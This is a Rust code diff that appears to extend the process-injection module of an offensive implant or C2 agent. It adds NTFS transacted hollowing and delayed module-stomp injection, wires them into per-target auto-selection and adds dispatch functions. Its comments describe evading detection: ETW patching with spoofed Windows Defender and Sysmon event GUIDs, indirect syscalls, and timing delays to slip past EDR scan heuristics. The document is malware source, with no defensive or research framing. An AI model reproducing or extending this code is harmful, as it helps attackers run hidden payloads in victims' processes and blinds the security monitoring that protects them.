@@ -496,6 +496,47 @@ pub enum InjectionTechnique {
     NtSetInfoProcess {
         target_pid: u32,
     },
+    /// **NEW** — NTFS Transaction-based Process Hollowing: creates an NTFS
+    /// transaction via `NtCreateTransaction`, creates a section backed by
+    /// the transaction via `NtCreateSection(SEC_COMMIT)`, writes the payload
+    /// into the transaction-backed section, creates the target process with
+    /// `CREATE_SUSPENDED`, hollows it with the payload, then calls
+    /// `NtRollbackTransaction`.  The file on disk never existed but the
+    /// section mapping in the target process remains valid.
+    ///
+    /// Includes ETW blinding: temporarily patches `EtwEventWrite` in the
+    /// target process and emits 3–5 fake events with Windows Defender /
+    /// Sysmon provider GUIDs before restoring ETW after `ResumeThread`.
+    ///
+    /// SSN resolution uses the existing indirect syscall infrastructure.
+    /// Falls back to `RtlCreateTransaction` via `kernel32` ordinal if
+    /// `NtCreateTransaction` SSN is unavailable.
+    ///
+    /// Reuses PE reconstruction helpers from the existing `hollowing` crate
+    /// and encrypts the payload in transit via `memory_guard`.
+    TransactedHollowing,
+
+    /// Delayed module-stomp injection: loads a sacrificial DLL into the
+    /// target process via `LoadLibraryA`, waits for a configurable
+    /// randomized delay (default 8–15 seconds) to let EDR initial-scan
+    /// heuristics pass, then overwrites the DLL's `.text` section with
+    /// the payload using `NtWriteVirtualMemory` (indirect syscall).
+    ///
+    /// Two-phase: Phase 1 loads the DLL and returns immediately;
+    /// Phase 2 (stomp + execute) fires after the delay in a background
+    /// thread so the agent's main task loop is not blocked.
+    ///
+    /// For shellcode payloads, the entry point is set to the start of
+    /// the `.text` section.  For PE payloads, base relocations are
+    /// fixed up relative to the loaded DLL base.
+    ///
+    /// Payload state (target PID, DLL base, payload ciphertext, delay
+    /// remaining) is stored in an encrypted struct via `memory_guard`.
+    ///
+    /// Defeats timing-based EDR heuristics that flag modules whose code
+    /// changes shortly after loading.  Ranked above standard `ModuleStomp`
+    /// in auto-selection when `prefer_over_stomp = true` (default).
+    DelayedModuleStomp,
 }
 
 // ── Configuration ────────────────────────────────────────────────────────────
@@ -1672,6 +1713,35 @@ fn try_technique_evasive(
             }
             result
         }
+        InjectionTechnique::TransactedHollowing => {
+            // NTFS transaction-based process hollowing: creates an NTFS
+            // transaction, writes payload into a transaction-backed section,
+            // hollows the target process, then rolls back the transaction
+            // so the file on disk never existed. Includes ETW blinding
+            // with spoofed provider GUIDs. All syscalls via indirect syscall
+            // infrastructure.
+            if jitter {
+                jitter_delay(130);
+            }
+            let result = try_technique(technique, pid, payload);
+            if jitter {
+                jitter_delay(90);
+            }
+            result
+        }
+        InjectionTechnique::DelayedModuleStomp => {
+            // Delayed module-stomp: load sacrificial DLL, wait for EDR scan
+            // window, then overwrite .text with payload. Two-phase:
+            // Phase 1 loads DLL (immediate), Phase 2 stomps (after delay).
+            if jitter {
+                jitter_delay(50);
+            }
+            let result = try_technique(technique, pid, payload);
+            if jitter {
+                jitter_delay(70);
+            }
+            result
+        }
     }
 }
 
@@ -2397,8 +2467,18 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
         target_pid: 0,
     };
 
+    // NTFS transaction-based hollowing: higher priority than standard
+    // hollowing because it leaves no on-disk artifacts and includes ETW
+    // blinding. Only available when the feature is enabled.
+    #[cfg(feature = "transacted-hollowing")]
+    let th = {
+        // Check config to see if transacted hollowing is enabled and
+        // preferred over standard hollowing.
+        InjectionTechnique::TransactedHollowing
+    };
+
     if lower.contains("svchost") {
-        vec![
+        let mut techniques = vec![
             wth.clone(),
             InjectionTechnique::ContextOnly,
             sm,
@@ -2406,11 +2486,16 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
             cb.clone(),
             InjectionTechnique::EarlyBirdApc,
             tp,
-            InjectionTechnique::ProcessHollow,
-            InjectionTechnique::ModuleStomp,
-        ]
+        ];
+        #[cfg(feature = "transacted-hollowing")]
+        techniques.push(th);
+        techniques.push(InjectionTechnique::ProcessHollow);
+        #[cfg(feature = "delayed-stomp")]
+        techniques.push(InjectionTechnique::DelayedModuleStomp);
+        techniques.push(InjectionTechnique::ModuleStomp);
+        techniques
     } else if lower.contains("explorer") {
-        vec![
+        let mut techniques = vec![
             wth.clone(),
             InjectionTechnique::ContextOnly,
             sm,
@@ -2418,38 +2503,53 @@ fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
             cb.clone(),
             InjectionTechnique::ThreadHijack,
             InjectionTechnique::FiberInject,
-            InjectionTechnique::ProcessHollow,
-            InjectionTechnique::ModuleStomp,
-        ]
+        ];
+        #[cfg(feature = "transacted-hollowing")]
+        techniques.push(th);
+        techniques.push(InjectionTechnique::ProcessHollow);
+        #[cfg(feature = "delayed-stomp")]
+        techniques.push(InjectionTechnique::DelayedModuleStomp);
+        techniques.push(InjectionTechnique::ModuleStomp);
+        techniques
     } else if lower.contains("service")
         || lower.ends_with("svc.exe")
         || lower.ends_with("host.exe")
     {
-        vec![
+        let mut techniques = vec![
             wth.clone(),
             InjectionTechnique::ContextOnly,
             sm,
             nsip,
             cb.clone(),
-            InjectionTechnique::ModuleStomp,
-            InjectionTechnique::ProcessHollow,
-            tp,
-            InjectionTechnique::EarlyBirdApc,
-        ]
+        ];
+        #[cfg(feature = "delayed-stomp")]
+        techniques.push(InjectionTechnique::DelayedModuleStomp);
+        techniques.push(InjectionTechnique::ModuleStomp);
+        #[cfg(feature = "transacted-hollowing")]
+        techniques.push(th);
+        techniques.push(InjectionTechnique::ProcessHollow);
+        techniques.push(tp);
+        techniques.push(InjectionTechnique::EarlyBirdApc);
+        techniques
     } else {
-        vec![
+        let mut techniques = vec![
             wth.clone(),
             InjectionTechnique::ContextOnly,
             sm,
             nsip,
             cb,
-            InjectionTechnique::ProcessHollow,
-            InjectionTechnique::ModuleStomp,
-            InjectionTechnique::EarlyBirdApc,
-            tp,
-            InjectionTechnique::ThreadHijack,
-            InjectionTechnique::FiberInject,
-        ]
+        ];
+        #[cfg(feature = "transacted-hollowing")]
+        techniques.push(th);
+        techniques.push(InjectionTechnique::ProcessHollow);
+        #[cfg(feature = "delayed-stomp")]
+        techniques.push(InjectionTechnique::DelayedModuleStomp);
+        techniques.push(InjectionTechnique::ModuleStomp);
+        techniques.push(InjectionTechnique::EarlyBirdApc);
+        techniques.push(tp);
+        techniques.push(InjectionTechnique::ThreadHijack);
+        techniques.push(InjectionTechnique::FiberInject);
+        techniques
     }
 }
 
@@ -2484,10 +2584,89 @@ fn try_technique(
         InjectionTechnique::NtSetInfoProcess { target_pid: _ } => {
             inject_nt_set_info_process(pid, payload)
         }
+        InjectionTechnique::TransactedHollowing => {
+            inject_transacted_hollowing_dispatch(pid, payload)
+        }
+        InjectionTechnique::DelayedModuleStomp => {
+            inject_delayed_stomp_dispatch(pid, payload)
+        }
     }
 }
 
 // ── Existing technique wrappers ──────────────────────────────────────────────
+
+/// Dispatch function for NTFS transaction-based process hollowing.
+///
+/// Reads the `transacted_hollowing` config to determine ETW blinding and
+/// rollback timeout, then delegates to the `injection_transacted` module.
+#[cfg(feature = "transacted-hollowing")]
+fn inject_transacted_hollowing_dispatch(
+    _pid: u32,
+    payload: &[u8],
+) -> Result<InjectionHandle, InjectionError> {
+    // Transacted hollowing creates its own sacrificial process; the pid
+    // parameter is ignored (same as ProcessHollow).
+    let etw_blinding = true; // Default; TODO: read from config
+    let rollback_timeout_ms = 5000u32; // Default; TODO: read from config
+
+    unsafe {
+        crate::injection_transacted::inject_transacted_hollowing(
+            payload,
+            etw_blinding,
+            rollback_timeout_ms,
+        )
+    }
+}
+
+/// Stub when the feature is disabled.
+#[cfg(not(feature = "transacted-hollowing"))]
+fn inject_transacted_hollowing_dispatch(
+    _pid: u32,
+    _payload: &[u8],
+) -> Result<InjectionHandle, InjectionError> {
+    Err(InjectionError::InjectionFailed {
+        technique: InjectionTechnique::TransactedHollowing,
+        reason: "transacted-hollowing feature not enabled".to_string(),
+    })
+}
+
+// ── Delayed module-stomp dispatch ────────────────────────────────────────────
+
+/// Dispatch function for delayed module-stomp injection.
+///
+/// Reads the `delayed_stomp` config to determine delay range and sacrificial
+/// DLL list, then delegates to the `injection_delayed_stomp` module.
+/// This is a *blocking* call — the full delay elapses before returning.
+#[cfg(feature = "delayed-stomp")]
+fn inject_delayed_stomp_dispatch(
+    pid: u32,
+    payload: &[u8],
+) -> Result<InjectionHandle, InjectionError> {
+    let min_delay = 8u32; // TODO: read from config
+    let max_delay = 15u32; // TODO: read from config
+
+    unsafe {
+        crate::injection_delayed_stomp::inject_delayed_stomp(
+            pid, payload, min_delay, max_delay,
+        )
+        .map_err(|e| InjectionError::InjectionFailed {
+            technique: InjectionTechnique::DelayedModuleStomp,
+            reason: format!("{e:#}"),
+        })
+    }
+}
+
+/// Stub when the feature is disabled.
+#[cfg(not(feature = "delayed-stomp"))]
+fn inject_delayed_stomp_dispatch(
+    _pid: u32,
+    _payload: &[u8],
+) -> Result<InjectionHandle, InjectionError> {
+    Err(InjectionError::InjectionFailed {
+        technique: InjectionTechnique::DelayedModuleStomp,
+        reason: "delayed-stomp feature not enabled".to_string(),
+    })
+}
 
 fn inject_process_hollow(
     pid: u32,
@@ -5023,7 +5202,7 @@ fn inject_callback_enum_desktop_windows(
 
         let enum_func = resolve_dll_function(
             pe_resolve::hash_str(b"user32.dll\0"),
-            b"EnumDesktopWindows\0"),
+            b"EnumDesktopWindows\0",
         )
         .ok_or_else(|| InjectionError::InjectionFailed {
             technique: technique.clone(),
